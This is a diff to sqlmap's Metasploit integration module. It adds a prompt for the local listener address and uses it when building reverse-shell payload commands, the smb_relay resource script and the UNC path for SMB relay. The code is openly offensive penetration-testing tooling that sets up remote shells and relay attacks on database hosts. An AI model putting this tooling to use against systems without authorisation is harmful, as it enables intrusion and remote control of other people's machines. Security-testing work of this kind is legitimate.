@@ -62,6 +62,7 @@ class Metasploit:
 
     def __initVars(self):
         self.connectionStr  = None
+        self.lhostStr       = None
         self.rhostStr       = None
         self.portStr        = None
         self.payloadStr     = None
@@ -298,12 +299,30 @@ class Metasploit:
             raise sqlmapDataException, "unexpected connection type"
 
 
+    def __selectLhost(self):
+        if self.connectionStr.startswith("reverse"):
+            message = "which is the local address? [%s] " % self.localIP
+            address = readInput(message, default=self.localIP)
+
+            if not address:
+                address = self.localIP
+
+            return address
+
+        elif self.connectionStr.startswith("bind"):
+            return None
+
+        else:
+            raise sqlmapDataException, "unexpected connection type"
+
+
     def __selectConnection(self):
         return self.__skeletonSelection("connection type", self.__msfConnectionsList)
 
 
     def __prepareIngredients(self, encode=True, askChurrasco=True):
         self.connectionStr  = self.__selectConnection()
+        self.lhostStr       = self.__selectLhost()
         self.rhostStr       = self.__selectRhost()
         self.portStr        = self.__selectPort()
         self.payloadStr     = self.__selectPayload(askChurrasco)
@@ -323,7 +342,7 @@ class Metasploit:
             self.__cliCmd += " RHOST=%s" % self.rhostStr
 
         elif self.connectionStr.startswith("reverse"):
-            self.__cliCmd += " LHOST=%s" % self.localIP
+            self.__cliCmd += " LHOST=%s" % self.lhostStr
 
         else:
             raise sqlmapDataException, "unexpected connection type"
@@ -339,7 +358,7 @@ class Metasploit:
         self.__prepareIngredients(encode=False, askChurrasco=False)
 
         self.__resource  = "use windows/smb/smb_relay\n"
-        self.__resource += "set SRVHOST %s\n" % self.localIP
+        self.__resource += "set SRVHOST %s\n" % self.lhostStr
         self.__resource += "set SRVPORT %s\n" % self.__selectSMBPort()
         self.__resource += "set PAYLOAD %s/%s\n" % (self.payloadStr, self.connectionStr)
         self.__resource += "set LPORT %s\n" % self.portStr
@@ -348,7 +367,7 @@ class Metasploit:
             self.__resource += "set RHOST %s\n" % self.rhostStr
 
         elif self.connectionStr.startswith("reverse"):
-            self.__resource += "set LHOST %s\n" % self.localIP
+            self.__resource += "set LHOST %s\n" % self.lhostStr
 
         else:
             raise sqlmapDataException, "unexpected connection type"
@@ -369,7 +388,7 @@ class Metasploit:
         self.__payloadCmd += " LPORT=%s" % self.portStr
 
         if self.connectionStr.startswith("reverse"):
-            self.__payloadCmd += " LHOST=%s" % self.localIP
+            self.__payloadCmd += " LHOST=%s" % self.lhostStr
 
         elif not self.connectionStr.startswith("bind"):
             raise sqlmapDataException, "unexpected connection type"
@@ -641,13 +660,14 @@ class Metasploit:
         self.__initVars()
         self.__randFile = "sqlmapunc%s.txt" % randomStr(lowercase=True)
 
-        if kb.dbms in ( "MySQL", "PostgreSQL" ):
-            self.uncPath = "\\\\\\\\%s\\\\%s" % (self.localIP, self.__randFile)
-        else:
-            self.uncPath = "\\\\%s\\%s" % (self.localIP, self.__randFile)
-
         self.__forgeMsfConsoleResource()
         self.__forgeMsfConsoleCmd()
+
+        if kb.dbms in ( "MySQL", "PostgreSQL" ):
+            self.uncPath = "\\\\\\\\%s\\\\%s" % (self.lhostStr, self.__randFile)
+        else:
+            self.uncPath = "\\\\%s\\%s" % (self.lhostStr, self.__randFile)
+
         self.__runMsfConsole()
 
         debugMsg  = "Metasploit Framework 3 console exited with return "
